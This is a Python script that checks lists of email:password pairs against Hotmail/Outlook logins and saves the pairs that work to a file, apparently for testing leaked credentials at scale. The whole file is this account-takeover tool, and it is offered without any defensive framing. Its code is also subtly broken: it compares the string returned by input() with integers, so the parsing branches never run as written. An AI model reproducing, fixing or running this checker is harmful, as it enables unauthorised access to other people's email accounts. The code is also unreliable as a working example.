import outlook
    
def cleanStringDiferentLineUserPass ( stringChain ):
	position = stringChain.find(':') + 1
	stringChain = stringChain[position:]
	stringChain = stringChain.strip()
	return stringChain

def cleanStringSameLineUser ( stringChain ):
	position = stringChain.find(':')
	stringChain = stringChain[:position]
	stringChain = stringChain.strip()
	return stringChain

def cleanStringSameLinePass ( stringChain ):
	position = stringChain.find(':') + 1
	stringChain = stringChain[position:]
	stringChain = stringChain.strip()
	return stringChain

def validateHotmailEmail ( email ):
	if 'hotmail' in email.lower():
		return True
	return False
	
def testConnection ( userName, passw ):
	mail = outlook.Outlook()
	try:
		return mail.loginMine(userName, passw)
	except:
		return False
	
emailPassLines = input("Email/Password position? 1 or 2 lines: ")


fileToRead = open('emails_to_check.txt', 'r')
fileToWrite = open('active_emails.txt', 'w')

userName = ''
passw = ''

for line in fileToRead:
	if emailPassLines == 1:
		if 'user' in line.lower():
			userName = cleanStringDiferentLineUserPass(line)
			passw = ''
		if 'pass' in line.lower():
			passw = cleanStringDiferentLineUserPass(line)
	elif emailPassLines == 2:
		userName = cleanStringSameLineUser(line)
		passw = cleanStringSameLinePass(line)

	if validateHotmailEmail ( userName ) == False:
		userName = ''

	if userName != '' and passw != '':
		print(userName + ' - ' + passw)
		if testConnection(userName, passw):
			fileToWrite.write(userName + '\n')
			fileToWrite.write(passw + '\n')
		userName = ''
		passw = ''
		
fileToRead.close()
fileToWrite.close()

print ('File created!')

 
